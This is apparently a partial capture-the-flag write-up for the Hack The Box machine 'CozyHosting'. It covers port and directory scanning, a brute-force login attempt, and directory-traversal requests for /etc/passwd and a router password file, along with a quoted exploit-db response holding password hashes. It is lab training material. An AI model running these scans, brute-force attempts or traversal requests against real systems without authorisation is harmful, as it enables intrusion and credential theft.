---
description: https://app.hackthebox.com/machines/CozyHosting
---

# CozyHosting

Nmap

```
-[Tue Feb 27-13:46:47]-[table@parrot]-
-[~]$ nmap -sV -sC -T5 10.10.11.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 13:46 PST
Nmap scan report for 10.10.11.230
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

Gobuster

```
-[Tue Feb 27-13:49:14]-[table@parrot]-
-[~]$ gobuster dir -u http://cozyhosting.htb/ --wordlist /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/logout               (Status: 204) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

whatweb

```
-[Wed Feb 28-15:57:13]-[table@parrot]-
-[~]$ whatweb http://cozyhosting.htb/
http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]

```

Attempting to login to the web portal using BurpSuite Intruder tab. This would be better if the BurpSuiteCE wasnt rate limited. Taking a long time to go through 168 million possibilities.\
Probably best to move on, now I will try to enumerate using the http-enum nmap script:

```
-[Wed Feb 28-16:07:37]-[table@parrot]-
-[~]$ nmap -sV --script=http-enum 10.10.11.230 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 16:43 PST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.085s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-enum: 
|   //system.html: CMNC-200 IP Camera
|   /Citrix//AccessPlatform/auth/clientscripts/cookies.js: Citrix
|   /.nsf/../winnt/win.ini: Lotus Domino
|   /uir//etc/passwd: Possible D-Link router directory traversal vulnerability (CVE-2018-10822)
|_  /uir//tmp/csman/0: Possible D-Link router plaintext password file exposure (CVE-2018-10824)
9000/tcp open  cslistener?
9999/tcp open  abyss?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.74 seconds

```

We get two listed vulnerabilities so let's try to exploit them.

### Exploitation

First, researching CVE-2018-10822, this vulnerability allows for directory traversal in the web interface on D-Link DWR-116 through 1.06, DIR-140L through 1.02, DIR-640L through 1.02, DWR-512 through 2.02, DWR-712 through 2.02, DWR-912 through 2.02, DWR-921 through 2.02, and DWR-111 through 1.01 devices. We can read arbitrary files via a /.. or // after "GET /uir" in an HTTP request:

```
GET /uri//etc/passwd
```

It may work in that it is not returning an error page, but there is more to do to see the contents. Let's research the CVE-2018-10824 vulnerability. It appears the administrative password is stored in plaintext in the /tmp/csman/0 file.

```
curl -X GET "http://cozyhosting.htb/uri//tmp/csman/0"
```

No luck there, further research. I found a github for a .yaml file relating to CVE-2018-10822. In the code I noticed the reference to exlpoit-db exploit # 45678.

Using searchsploit we find an exploit to try:

```
-[Wed Feb 28-17:19:34]-[table@parrot]-
-[~]$ searchsploit 45678
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
D-Link Routers - Directory Traversal                                                        | hardware/webapps/45678.md
-------------------------------------------------------------------------------------------- ---------------------------------
-------------------------------------------------------------------------------------------- ---------------------------------
 Shellcode Title                                                                            |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Linux/x64 - Bind_tcp (0.0.0.0:4444) + Password (12345678) + Shell (/bin/sh) Shellcode (142  | linux/49472.c
-------------------------------------------------------------------------------------------- ---------------------------------
Papers: No Results

```

From the research, it is interesting to note that the vulnerability can be used retrieve administrative password using the other disclosed vulnerability - CVE-2018-10824.

This vulnerability was reported previously by Patryk Bogdan in CVE-2017-6190 but he reported it is fixed in certain release but unfortunately it is still present in even newer releases. The vulnerability is also present in other D-Link routers and can be exploited not only (as the original author stated) by double dot but also absolutely using double slash.

Let's try to curl the ip address file location of passwd

```
-[Wed Feb 28-17:23:50]-[table@parrot]-
-[~]$ curl http://10.10.11.230/uir//etc/passwd
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

```

Interesting, we can check online to see if searching the previously known vulnerability that was not fixed, CVE-2017-6190, yields anything more.

We find in exploit-db exploit # 41840, we see:

```
HTTP Request:
GET /uir/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.2.1
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

HTTP Response:
HTTP/1.0 200 OK
Content-Type: application/x-none
Cache-Control: max-age=60
Connection: close

root:$1$$taUxCLWfe3rCh2ylnFWJ41:0:0:root:/root:/bin/ash
nobody:$1$$qRPK7m23GJusamGpoGLby/:99:99:nobody:/var/usb:/sbin/nologin
ftp:$1$$qRPK7m23GJusamGpoGLby/:14:50:FTP USER:/var/usb:/sbin/nologin


```

This is the right path but we must think harder on this. We could use the curl command again and follow the redirect with -L. Doing so takes us to the homepage though.

Using curl we find out Bootstrap's version Bootstrap v5.2.3. Searching for vulnerabilities, there are no direct vulnerabilities.

Another promising exploit website

{% embed url="https://sploit.tech/2018/10/12/D-Link.html" %}

Exploit is for a router.

There is a Whitelabel Error page, meaning no explicit mapping for /error. Researching this further.

The Whitelabel error parge is a result of the websites structure, by default Spring Boot will scan the components below your main application class.\
As of Spring Boot 2.0.0.RELEASE the default prefix for all endpoints is /actuator

Let's check that url:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We see sessions

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
